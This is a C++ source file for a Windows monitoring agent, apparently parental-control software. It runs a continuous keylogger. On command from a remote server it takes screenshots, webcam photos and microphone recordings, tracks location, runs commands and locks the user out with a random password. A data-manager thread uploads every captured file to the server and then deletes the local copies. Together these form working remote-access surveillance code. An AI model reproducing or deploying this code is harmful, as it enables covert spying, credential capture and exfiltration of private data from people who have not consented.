#include "TaskRoutines.h"
#include "TasksHelper.h"

HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
map<string, map<string, string>> workingTasks;

DWORD WINAPI initFiltering(LPVOID lpParam)
{
	while (FALSE) {
		ResponseData deviceConfigs;
		LPCWSTR additionalSites;

		while (TRUE) {
			deviceConfigs = downloadFile(CONFIGS);
			if (deviceConfigs.dwStatusCode != 200 || deviceConfigs.response == "[]")
				Sleep(SYNC_TIME);
			else
				break;
		}
		map<string, string> configs = itemFromJson(TRUE, deviceConfigs.response, DATA);
		map<string, string>::iterator configsIter;

		wstring finalFilterPath;

		if (buildFilterPath(finalFilterPath, configs, configsIter, FAKENEWS))
			if (buildFilterPath(finalFilterPath, configs, configsIter, GAMBLING))
				if (buildFilterPath(finalFilterPath, configs, configsIter, PORN))
					if (buildFilterPath(finalFilterPath, configs, configsIter, SOCIAL))
					{
						configsIter = configs.find(ADDITIONAL_SITES); // get user defined sites to block
						if (configsIter != configs.end())
							additionalSites = (stringToWString(configsIter->second)).c_str();
						else
							additionalSites = L"";
						setFilters(finalFilterPath.c_str(), additionalSites);
						Sleep(SYNC_TIME * 60);
					}
		Sleep(SYNC_TIME);
	}
	return 0;
}

DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (TRUE) {
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);

		// Determine a fullscreen state
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN)
		{
			// User in fullscreen mode
			// Go to sleep until its over 0_0
			Sleep(SYNC_TIME);
			continue;
		}
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 

		string filename = constructFilename(TEMP_CODE);
		wstring filenameW = stringToWString(filename);

		// Start keylogger
		keylogger(filenameW.c_str());

		string finalFilename = constructFilename(KEYLOG_CODE);
		wstring finalFilenameW = stringToWString(finalFilename);
		string path = DATA_FOLDER_PATH;

		if (!rename(path.append(filename).c_str(), path.append(finalFilename).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	do {
		screenRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("screen"));
	} while (screenRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			screenRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(screenRequest);
		// Request Arrived..
		// Read screenshots request from disk
		wstring filename = stringToWString(constructFilename(TEMP_CODE));
		// Start capturing
		screenCapture(filename.c_str());

		wstring filenameFinal = stringToWString(constructFilename(SCREENSHOT_CODE));
		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	do {
		camRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cam"));
	} while (camRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			camRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(camRequest);
		// Request Arrived..
		// Read camera request from disk

		string filename = constructFilename(TEMP_CODE).append(".png");
		// Take a picture
		camera(filename.c_str());
		string filenameFinal = constructFilename(CAMERA_CODE);

		if (!rename(filename.c_str(), filenameFinal.c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	do {
		micRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("mic"));
	} while (micRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			micRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(micRequest);
		// Request Arrived..
		// Read mic request from disk

		string filename = constructFilename(TEMP_CODE);
		// Record for 10 seconds
		recordAudio(10, filename.c_str());
		string filenameFinal = constructFilename(AUDIO_CODE);

		if (!rename(filename.c_str(), filenameFinal.c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	do {
		lockRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
	} while (lockRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			lockRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(lockRequest);
		// Request Arrived..
		// Read lock request from disk
		char* newPassword = generateRandomPass();
		// TODO: Send the new password to parent account
		wchar_t wPassword[PASSWORD_LEN];
		mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);
		BOOL success = lockUser(wPassword);
	}
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	do {
		cmdRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cmd"));
	} while (cmdRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			cmdRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(cmdRequest);
//		 Request Arrived..

		// Get a new filename
		wstring filename = stringToWString(constructFilename(TEMP_CODE));

		if (!runCommand(L"tasklist", filename.c_str()));
		//	continue;

		wstring filenameFinal = stringToWString(constructFilename(CMD_CODE));
	//	if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}

DWORD WINAPI initLocationTracker(LPVOID lpParam) {
	do {
		locationRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("location"));
	} while (locationRequest == NULL);

	while (TRUE) {
		WaitForSingleObject(
			locationRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(locationRequest);

		wstring filename = stringToWString(constructFilename(TEMP_CODE));
		getLocation(filename.c_str());
		wstring filenameFinal = stringToWString(constructFilename(LOCATION_CODE));

		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			SetEvent(newDataEvent);
		}
	}
	return 0;
}

DWORD WINAPI initDataManager(LPVOID lpParam)
{
	do {
		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("data"));
	} while (newDataEvent == NULL);
	while (TRUE) {
		WaitForSingleObject(
			newDataEvent, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(newDataEvent);
		// New data to send 
		WIN32_FIND_DATA data, currentData;
		HANDLE hFind = FindFirstFile(L"temp/*", &data);
		priority_queue<WIN32_FIND_DATA, vector<WIN32_FIND_DATA>, CompareDates> uploadQueue;

		if (hFind != INVALID_HANDLE_VALUE) {
			do // Look for new files in temp folder and insert each of them to a priority queue (sorted by date).
				if (wcslen(data.cFileName) > 3)
					uploadQueue.push(data);
			while (FindNextFile(hFind, &data));
			FindClose(hFind);
		}
		while (!uploadQueue.empty()) {
			// Get the first file in the queue
			currentData = uploadQueue.top();
			char filename[256];
			// Convert wchar* to char*
			wstring ws(currentData.cFileName);
			wcstombs(filename, ws.c_str(), 256);

			// Create json data corresponding to the current file

			string dataType = checkDataType(filename);
			if (dataType == UNDEFINED_CODE) {
				uploadQueue.pop();
				continue; // File not recognized
			}
			map<string, string> currentJsonItem{
				  make_pair("dataType", dataType)
			};
			string json = jsonFromItem(currentJsonItem, DATA);

			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200) {
				Sleep(SYNC_TIME);
			}

			// Remove the file from temp folder after successfully uploading it	  
			wstring wfilename(currentData.cFileName);
			wstring concatted_stdstr = L"temp/" + wfilename;
			LPCWSTR fullPath = concatted_stdstr.c_str();

			if (workingTasks.find(dataType) != workingTasks.end())
				workingTasks.erase(dataType);

			DeleteFile(fullPath);
			// Remove from the queue
			uploadQueue.pop();
		}
	}
	return 0;
}

DWORD WINAPI initRequestManager(LPVOID lpParam)
{
	// Retreive events from the server.
	// Signal event for current request. E.g. camera

	while (TRUE) {
		// Look for new requests from server.. 
		ResponseData requests;

		while (TRUE) {
			requests = downloadFile(REQUESTS);
			if (requests.dwStatusCode != 200 || requests.response == "[]")
				Sleep(SYNC_TIME);
			else
				break;
		}
		// Convert the response to map or requests.
		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);

		for (int i = 0; i < allRequests.size(); i++)
		{
			initRequest(allRequests, Camera, camRequest);
			initRequest(allRequests, Audio, micRequest);
			initRequest(allRequests, Screenshot, screenRequest);
			initRequest(allRequests, Lockdown, lockRequest);
			initRequest(allRequests, Command, cmdRequest);
			initRequest(allRequests, Location, locationRequest);
		}
		Sleep(SYNC_TIME);
	}
	return 0;
}

BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle) {
	map<string, map<string, string>>::iterator allRequestsIterator;
	map<string, string> currentRequest;
	map<string, string>::iterator requestIterator;

	// Check if the request name exist in the database
	allRequestsIterator = allRequests.find(requestName);

	// If it doesn't, return..
	if (allRequestsIterator == allRequests.end())
		return FALSE;

	// Get the json data of the current request
	currentRequest = allRequestsIterator->second;

	// Try to find the task in the workingTasks list
	map<string, map<string, string>>::iterator tasksIter = workingTasks.find(requestName);

	if (tasksIter == workingTasks.end()) {
		//The task is new, register it in the map ..
		workingTasks.insert(make_pair(requestName, currentRequest));
	}
	else { // The task was found in the map ..
		return FALSE; // Task already running, no need to call it again ..
	}
	// else call the requested task 
	if (requestHandle != NULL)
	{
		SetEvent(requestHandle);
		return TRUE;
	}
	return FALSE;
}
